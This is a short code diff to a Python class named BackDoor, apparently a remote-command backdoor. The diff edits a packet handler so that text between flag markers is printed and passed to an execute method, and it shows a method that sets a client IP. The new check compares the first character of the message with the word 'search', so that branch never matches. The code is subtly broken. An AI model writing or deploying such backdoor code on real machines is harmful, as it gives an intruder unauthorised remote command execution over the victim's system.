@@ -425,11 +425,13 @@ class BackDoor:
         except:
             return
 
-
     def process_packet(self, data):
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
-        print(f"Executing: {stripped_msg}")
-        self.execute(stripped_msg)
+        if stripped_msg.strip()[0] == "search":
+            print("search")
+        else:
+            print(f"Executing: {stripped_msg}")
+            self.execute(stripped_msg)
 
     def set_client(self, ip):
         print(f"Setting client ip as {ip}")
